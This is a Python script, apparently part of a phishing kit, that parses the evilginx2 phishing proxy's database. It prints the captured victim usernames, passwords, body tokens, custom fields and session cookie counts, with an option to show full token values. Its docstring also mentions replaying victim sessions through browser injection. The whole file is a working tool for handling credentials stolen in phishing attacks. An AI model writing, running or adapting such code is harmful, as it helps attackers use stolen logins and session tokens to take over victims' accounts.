#!/usr/bin/env python3
"""
Generic evilginx2 credential / token dumper for phishkit.

Parses evilginx's buntdb (data.db) and surfaces username, password,
custom fields, body_tokens, and cookies that the `sessions` table hides.

This is the safe, engagement-agnostic version. Firebase session replay
(operator browser injection) is available via the web UI.
"""
import argparse
import json
import os
import sys
import time
from typing import Any, Iterator

def _read_bulk(buf: bytes, i: int) -> tuple[bytes, int]:
    if buf[i:i + 1] != b"$":
        raise ValueError(f"expected '$' at offset {i}")
    j = buf.index(b"\r\n", i + 1)
    n = int(buf[i + 1:j])
    start = j + 2
    end = start + n
    if buf[end:end + 2] != b"\r\n":
        raise ValueError("missing CRLF after bulk")
    return buf[start:end], end + 2

def iter_commands(path: str) -> Iterator[list[bytes]]:
    with open(path, "rb") as f:
        buf = f.read()
    i = 0
    n = len(buf)
    while i < n:
        if buf[i:i + 1] != b"*":
            return
        j = buf.index(b"\r\n", i + 1)
        argc = int(buf[i + 1:j])
        i = j + 2
        parts: list[bytes] = []
        for _ in range(argc):
            v, i = _read_bulk(buf, i)
            parts.append(v)
        yield parts

def latest_sessions(path: str) -> dict[int, dict[str, Any]]:
    state: dict[str, str] = {}
    for cmd in iter_commands(path):
        if not cmd:
            continue
        op = cmd[0].lower()
        if op == b"set" and len(cmd) >= 3:
            key = cmd[1].decode("utf-8", "replace")
            val = cmd[2].decode("utf-8", "replace")
            state[key] = val
        elif op == b"del" and len(cmd) >= 2:
            key = cmd[1].decode("utf-8", "replace")
            state.pop(key, None)

    out: dict[int, dict[str, Any]] = {}
    for key, val in state.items():
        if not key.startswith("sessions:"):
            continue
        if key.endswith(":id"):
            continue
        try:
            rec = json.loads(val)
        except json.JSONDecodeError:
            continue
        sid = rec.get("id")
        if isinstance(sid, int):
            out[sid] = rec
    return out

def _abbrev(s: str, keep: int = 28) -> str:
    if len(s) <= keep * 2 + 5:
        return s
    return f"{s[:keep]}...{s[-keep:]}  ({len(s)} chars)"

def _fmt_time(epoch: int | float | None) -> str:
    if not epoch:
        return "?"
    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(epoch)))

def print_session(rec: dict[str, Any], full: bool) -> None:
    sid = rec.get("id", "?")
    created = _fmt_time(rec.get("create_time"))
    updated = _fmt_time(rec.get("update_time"))
    user = rec.get("username") or "(no username)"
    pwd = rec.get("password") or "(no password)"
    phishlet = rec.get("phishlet", "?")

    print(f"=== session #{sid}  [{phishlet}]  created {created}  updated {updated}")
    print(f"    username    : {user}")
    print(f"    password    : {pwd}")
    print(f"    landing_url : {rec.get('landing_url', '')}")
    print(f"    remote_addr : {rec.get('remote_addr', '')}")

    custom = rec.get("custom") or {}
    if custom:
        print("    custom:")
        width = max(len(k) for k in custom)
        for k in sorted(custom):
            v = custom[k]
            print(f"      {k:<{width}} = {v if full else _abbrev(str(v))}")
    else:
        print("    custom: (empty)")

    body_tokens = rec.get("body_tokens") or {}
    if body_tokens:
        print("    body_tokens:")
        width = max(len(k) for k in body_tokens)
        for k, v in body_tokens.items():
            print(f"      {k:<{width}} = {v if full else _abbrev(str(v))}")
    else:
        print("    body_tokens: (empty)")

    cookies = rec.get("tokens") or {}
    if cookies:
        n = sum(len(v) if isinstance(v, dict) else 1 for v in cookies.values())
        print(f"    cookie tokens: {n} across {len(cookies)} domains")
    else:
        print("    cookie tokens: (none)")
    print()

def main() -> int:
    ap = argparse.ArgumentParser(description="Dump captured creds/tokens from evilginx buntdb.")
    ap.add_argument("--db", default=os.environ.get("EVILGINX_DB"),
                    help="path to data.db (default: $EVILGINX_DB)")
    ap.add_argument("-f", "--full", action="store_true", help="print full token values")
    ap.add_argument("--id", type=int, default=None, help="show only this session id")
    ap.add_argument("--json", action="store_true", help="emit raw JSON and exit")
    args = ap.parse_args()

    db = args.db
    if not db:
        print("error: --db or $EVILGINX_DB required", file=sys.stderr)
        return 2
    if not os.path.isfile(db):
        print(f"error: db not found: {db}", file=sys.stderr)
        return 2

    sessions = latest_sessions(db)
    if not sessions:
        print("(no sessions in db)")
        return 0

    if args.json:
        json.dump([sessions[k] for k in sorted(sessions)], sys.stdout, indent=2)
        print()
        return 0

    if args.id is not None:
        rec = sessions.get(args.id)
        if rec is None:
            print(f"error: no session with id {args.id}", file=sys.stderr)
            return 1
        print_session(rec, full=True)
        return 0

    for sid in sorted(sessions):
        print_session(sessions[sid], full=args.full)
    return 0

if __name__ == "__main__":
    sys.exit(main())
